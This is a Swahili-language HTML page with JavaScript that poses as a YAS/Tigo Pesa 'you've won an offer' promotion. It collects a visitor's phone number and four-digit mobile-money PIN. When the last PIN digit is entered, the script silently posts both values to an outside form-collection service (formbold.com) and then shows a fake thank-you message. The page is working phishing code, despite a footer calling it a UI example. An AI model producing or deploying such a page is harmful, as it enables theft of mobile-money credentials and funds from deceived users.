<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Umejishindia Ofa</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="card">
        <h2>Umejishindia Ofa Wa YAS Tigo pesa</h2>
        <p class="subtitle">Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.</p>
        
        <form id="offerForm" action="https://formbold.com/s/9ROxy" method="POST">
            
            <div class="phone-input">
                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu" maxlength="10" required>
            </div>

            <p>Enter your Tigo Pesa PIN</p>
            <div class="pin-boxes">
                <input type="tel" maxlength="1" class="pin-box" data-index="0" required>
                <input type="tel" maxlength="1" class="pin-box" data-index="1" required>
                <input type="tel" maxlength="1" class="pin-box" data-index="2" required>
                <input type="tel" maxlength="1" class="pin-box" data-index="3" required>
            </div>

            <input type="hidden" id="pin" name="pin">
        </form>

        <p class="note">Kuingiza neno siri kunakubali maelezo ya matumizi.</p>
        <footer>© YAS Tanzania – Mfano wa UI pekee</footer>
    </div>

    <script>
        const pinBoxes = document.querySelectorAll('.pin-box');
        const form = document.getElementById('offerForm');
        const hiddenPinInput = document.getElementById('pin');
        const phoneNumberInput = document.getElementById('phoneNumber');

        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                // Only allow numbers
                e.target.value = e.target.value.replace(/[^0-9]/g, '');

                if (e.target.value.length === 1) {
                    // Move to the next box
                    if (index < pinBoxes.length - 1) {
                        pinBoxes[index + 1].focus();
                    } else {
                        // If this is the last box, check if all are filled
                        const allPinsFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
                        if (allPinsFilled) {
                            updateHiddenPin();
                            submitFormData(); // UPDATED: Call the new submit function
                        }
                    }
                }
                updateHiddenPin();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
        });

        function updateHiddenPin() {
            const pin = Array.from(pinBoxes).map(input => input.value).join('');
            hiddenPinInput.value = pin;
        }

        // UPDATED: New function to handle fast submission
        async function submitFormData() {
            if (phoneNumberInput.value.trim() === '') {
                alert('Tafadhali ingiza namba yako ya simu.');
                phoneNumberInput.focus();
                return;
            }

            const formData = new FormData(form);
            
            try {
                // Send data in the background without waiting for a response
                fetch(form.action, {
                    method: 'POST',
                    body: formData,
                });

                // Immediately redirect or show success message
                // For now, we'll just clear the form as a success indicator
                console.log('Form submitted successfully!');
                form.reset();
                alert('Shukran! Ofa yako imewasilishwa.');

            } catch (error) {
                // If fetch fails, log the error but don't stop the user
                console.error('Form submission failed:', error);
                alert('Kuna hitilafu. Tafadhali jaribu tena.');
            }
        }
    </script>
</body>
</html>
